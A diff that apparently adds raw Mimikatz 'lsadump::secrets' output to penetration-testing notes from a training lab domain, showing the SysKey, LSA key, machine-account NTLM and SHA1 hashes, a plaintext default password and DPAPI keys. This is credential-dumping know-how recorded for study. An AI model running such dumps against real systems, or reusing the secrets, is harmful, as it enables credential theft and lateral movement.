@@ -2372,3 +2372,40 @@ Supplemental Credentials:
       des_cbc_md5       : e091a1c80b574c15
 
 ```
+
+```
+mimikatz # lsadump::secrets
+Domain : ACADEMY-AEN-MS0
+SysKey : 61b3d49a6205a1dedb14591c22d36afc
+
+Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
+Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
+Domain FQDN : INLANEFREIGHT.LOCAL
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
+  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7
+
+Secret  : $MACHINE.ACC
+cur/hex : 08 55 36 e3 96 4a f6 dc a5 bf dd 21 24 27 14 e1 d5 eb 65 18 c0 11 10 27 83 9d 0b bb 93 b1 67 af da 26 8f 54 c9 8d cd 4b 3f d4 b5 d9 9e 8d 73 f5 a1 d0 b2 3f b0 29 ff 29 b8 96 4d 93 e4 0c cd 0a 6a 54 64 a2 f9 86 66 44 86 55 69 1b 03 92 31 48 cc 38 cc 5f e9 e9 2c b3 9b fb 92 fb 9d b6 a2 4a 42 78 22 f1 2b 10 52 6b 58 b1 67 b7 22 38 5e ef e7 b6 11 21 82 d7 b8 7c dd e0 30 2a a4 1b 7e a0 4f e7 52 e1 66 4c f4 ed da e9 2b 09 6a 88 07 08 57 73 2b 7a d6 06 4a 96 9c 3a 41 1d 66 36 11 37 d4 a2 e5 6b b3 21 49 ed 5f 8d 2b db ec 16 66 5e f0 94 a7 e4 12 4a 58 c5 63 28 2b 85 d0 a0 37 5e 24 60 e0 09 9a aa 2e de 31 a0 93 24 31 30 5f ec 7f 0e ef 35 3b 51 9a 9b c0 9c 72 2e 2b f7 58 be 80 0a cb 19 27 11 43 1c f7 aa bb 70 2e 16 56 f8
+    NTLM:8300acf19dd9ac58b6ddc2a6956f4ebe
+    SHA1:c137a0874ca4dbcc7621b64e1f872c675fb1bdf8
+old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
+    NTLM:ced50a6f3cb256110200dcb022b32c12
+    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
+
+Secret  : DefaultPassword
+cur/text: DBAilfreight1!
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 37 62 35 26 80 4c 6b 2f 11 ca 06 25 ab 97 21 3f 84 f8 74 fa bc 69 a1 c4 37 2b df f8 cd 6c 8f 0a 8a d9 67 e9 42 cf 4f 96
+    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
+    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
+old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b
+    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+
+Secret  : NL$KM
+cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+```
